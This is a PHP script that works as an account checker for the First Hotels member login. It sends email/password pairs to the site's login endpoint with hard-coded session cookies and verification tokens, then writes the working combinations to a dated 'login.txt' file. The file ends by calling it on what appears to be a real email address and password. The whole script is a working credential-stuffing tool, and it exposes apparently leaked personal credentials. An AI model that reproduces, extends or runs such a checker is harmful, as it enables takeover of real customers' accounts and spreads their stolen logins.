<?php
    function Api($email, $password){
        $date = date("d/m/Y | H:i:s");
        $header = [
            'Host: www.firsthotels.com',
            'Cookie: _scid=0e8d4340-0c08-4ae3-8300-c7805c0314ef; _gcl_au=1.1.1131553843.1701991848; _fbp=fb.1.1701991848448.553186742; _ga=GA1.1.1966403049.1701991849; _hjSessionUser_1212497=eyJpZCI6IjljYmY5YzA0LTFkNzQtNTlmYS05OTBiLWNkZGUyYjIzOWE2NyIsImNyZWF0ZWQiOjE3MDE5OTE4NTExOTQsImV4aXN0aW5nIjp0cnVlfQ==; firstMemberTop=Yes; FirstHotels=gtc5hezm3lpsd034zq3vath2; __RequestVerificationToken=hTRkOpAwW2D8EzQF3W9XV3Iecel8SqcztugfIdq_-qQmXev8f61B8r8VwQ6bdXfCqTFic8x2VuaiWiz86kIhCgkS5xxJjD58IaIG2GmRNnw1; _hjIncludedInSessionSample_1212497=0; _hjSession_1212497=eyJpZCI6ImJiMTJjZmMwLTczYjYtNDVhZS04NTY1LWVhZDVlMTBiYWI0MCIsImNyZWF0ZWQiOjE3MDIwNzEwNjI3OTAsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6dHJ1ZX0=; _hjAbsoluteSessionInProgress=0; _ga_CM3PX01HLE=GS1.1.1702071062.2.1.1702071149.0.0.0; sessionLogIn=true; _scid_r=0e8d4340-0c08-4ae3-8300-c7805c0314ef; _uetsid=a6b43160955811ee9b70c5b77079ce8d; _uetvid=a6b45ab0955811ee8a7c7be9f0c6e22a',
            'Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"',
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With: XMLHttpRequest',
            'Sec-Ch-Ua-Mobile: ?0',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36',
            'Sec-Ch-Ua-Platform: "Windows"',
            'Origin: https://www.firsthotels.com',
            'Sec-Fetch-Site: same-origin',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Dest: empty',
            'Referer: https://www.firsthotels.com/first-member/log-in/',
            'Priority: u=1, i'
        ];
        $post = '__RequestVerificationToken=Q21kmHLZ4jGqOU3qgtSeAv_c5U57qmV1Yv-j4Uep4YMASHZunmSUYu32o3zCmo22Mua7X3urwsuvxg-Q1fJLokXAekhvDGG2V5SBM1uYhUI1&token=638376714682130837&comment=&Email='.$email.'&Password='.$password.'&RememberMe=false&LoginAndStop=False&LoginAndStopBeUrl=&X-Requested-With=XMLHttpRequest';
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => "https://www.firsthotels.com/first-member/log-in/MemberLoginAsync/?name=memberlogin&data_disable_after_submit=True",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_MAXREDIRS => -1,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_HTTPHEADER => $header,
            CURLOPT_POSTFIELDS => $post,
            CURLOPT_CUSTOMREQUEST => "POST"
        ));
        $result = curl_exec($curl);
        curl_close($curl);
        if(strpos($result,"Successfully logged in and redirecting to your member page")){
            $info = 'Email: '.$email.' | Senha: '.$password.'  | '.$date;
            $DateSave = date("d_m_Y");
            $dir = "./key/".$DateSave;
            $file = "./key/".$DateSave."/login.txt";
            if(!is_dir($dir)){
                mkdir($dir);
            }
            $SaveDoc = fopen($file, "a+");
            fwrite($SaveDoc, $info."\n");
            fclose($SaveDoc);
            echo"\e[0;32;42m[ • ] \e[0m\e[0;42m [ > FIRSTHOTELS'API < ]  SUCCESS LOGIN: $email | $password | [ $date ]"."\e[0m\e[0;32;42m [ • ] \e[0m\n";
        }else{
            echo"\e[1;33;43m[ • ] \e[0m\e[0;43m [ > FIRSTHOTELS'API < ]  INVALID LOGIN: $email | $password | [ $date ]"."\e[0m\e[1;33;43m [ • ] \e[0m\n";
        }
    }
    Api("jan.willem@gmx.com","321Koffie%3F!");
?>